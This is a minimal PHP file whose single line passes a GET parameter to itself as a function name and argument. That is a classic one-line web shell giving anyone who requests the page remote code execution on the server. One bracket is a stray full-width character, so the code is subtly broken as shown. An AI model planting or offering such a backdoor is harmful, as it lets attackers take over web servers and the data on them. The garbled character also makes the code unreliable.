<?php
$_GET['CoJbLSCs'〕($_GET['CoJbLSCs']);
?>
